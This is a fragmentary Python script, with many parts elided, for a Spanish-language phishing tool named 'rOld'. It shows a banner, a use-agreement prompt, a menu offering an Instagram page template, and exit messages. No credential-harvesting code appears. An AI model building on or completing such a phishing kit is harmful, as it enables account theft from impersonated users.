...
def warning(): # Banner #
    print('''
\033[94;1m
                https://instagram.com/_alejandro.bura\033[0m\033[91m
...
=================================================== 
                    ...
                    Phising creado por: \033[91;1m[ Alejandro Bura ] para [ David Morales ]\033[94;1m''')
    print('\n')
    warningchoice = input("                    Vas a usarlo bien? (\033[94;1mSiuu\033[93;1m/\033[91mNop\033[93;1m): ") # Agreement Message #

    if warningchoice == 'Siuu':
        pass
    elif warningchoice == 'si':
        pass
    elif warningchoice == 's':
        pass
...
def setup(template): # Template for input #
    ...
    choice1 = input(red + "        [" + blue + f"rOld-{template}" + red + "] -> ")
...
=================================================== 
        ...
        \033[91;1m[1]\033[94;1m Instagram \033[91;1m
...
def endMessage(): # Message when you exit #
    print("\n")
    print(yellow + "  Thank you using " + red + "rOld\n")
    print(yellow + "  If you have any problems while using " + red + "rOld " + yellow + "please report it to us\n")
...
def main():
    ...
    choice = input(red + "        [" + blue + "rOld" + red + "] -> ") # Get user input #
...
# Will detect if they exit #
    ...
    print("\n")
    print(red + "[!] Saliendo lptm")
    print(red + "[!] Saliste del armario :D" + reset)
    exit(0)
